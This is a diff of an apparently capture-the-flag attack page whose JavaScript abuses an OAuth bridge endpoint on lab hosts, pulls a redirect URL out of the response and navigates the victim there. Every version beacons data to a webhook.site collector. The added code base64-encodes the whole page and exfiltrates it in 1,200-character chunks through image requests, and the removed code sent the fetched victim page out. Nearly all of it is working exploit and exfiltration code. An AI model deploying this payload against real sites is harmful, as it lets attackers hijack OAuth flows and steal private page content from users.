@@ -1,22 +1,30 @@
-<!doctype html><html><body><h1>loading...</h1>
+<!doctype html><html><body><h1>loading</h1>
 <script>
 var C='https://webhook.site/e2800127-7671-4b5d-a058-6a5ed1f0d9ec';
-function ping(tag,d){try{var x=new XMLHttpRequest();x.open('POST',C,true);x.setRequestHeader('Content-Type','text/plain');x.send(tag+'|'+JSON.stringify(d||{})+'|'+location.href);}catch(e){try{fetch(C,{method:'POST',mode:'no-cors',body:tag+'-fb|'+String(e)})}catch(e2){}}}
+function ping(t,d){new Image().src=C+'?tag='+t+'&d='+encodeURIComponent(JSON.stringify(d||{}));}
 ping('JS-EXEC',{ua:navigator.userAgent});
+fetch('https://cloud-console-b0f96c6dbcec.pwnbox-lab.com/oauth/bridge?state='+encodeURIComponent('{\"target_host\":\"clf-b0f96c6dbcec.pwnbox-lab.com\",\"return_to\":\"/\"}'))
+.then(function(r){return r.text()})
+.then(function(t){
+  var m=t.match(/window\.location\s*=\s*"([^"]+)"/);
+  if(!m){ping('NO-MATCH',{head:t.slice(0,300)});return;}
+  var url=m[1].split('" + "').join('');
+  ping('NAV',{u:url.slice(0,140)});
+  setTimeout(function(){location=url;},300);
+})
+.catch(function(e){ping('ERR',{e:String(e)})});
+</script>
+<script>
 (function(){
- var HST='https://cloud-console-b0f96c6dbcec.pwnbox-lab.com';
- fetch(HST+'/oauth/bridge?state='+encodeURIComponent('{\"target_host\":\"clf-b0f96c6dbcec.pwnbox-lab.com\",\"return_to\":\"/\"}'),{credentials:'include'})
- .then(function(r){return r.text()})
- .then(function(t){
-   ping('BRIDGE-HTML',{head:t.slice(0,400)});
-   var m=t.match(/window\.location\s*=\s*"([^"]+)"/);
-   if(!m){ping('NO-MATCH');return null;}
-   var url=m[1].replace('" + "','');
-   ping('NAVIGATING',{url:url.slice(0,120)});
-   return fetch(url,{credentials:'omit'}).then(function(r){return r.text()}).then(function(page){
-     ping('VICTIM-PAGE',{page:page.slice(0,5000)});
-   });
- })
- .catch(function(e){ping('CHAIN-ERR',{e:String(e)})});
+ function bx(s){return btoa(unescape(encodeURIComponent(s)));}
+ var C='https://webhook.site/e2800127-7671-4b5d-a058-6a5ed1f0d9ec';
+ var html=document.documentElement.outerHTML;
+ var enc=bx(html);
+ new Image().src=C+'?tag=VICTIM-PAGE&len='+enc.length+'&i=0';
+ // chunked exfil through image urls (~1200 chars each)
+ for(var i=0,o=0;o<enc.length;i++,o+=1200){
+   new Image().src=C+'?tag=VC&i='+i+'&d='+enc.substr(o,1200);
+ }
 })();
-</script></body></html>
+</script>
+</body></html>
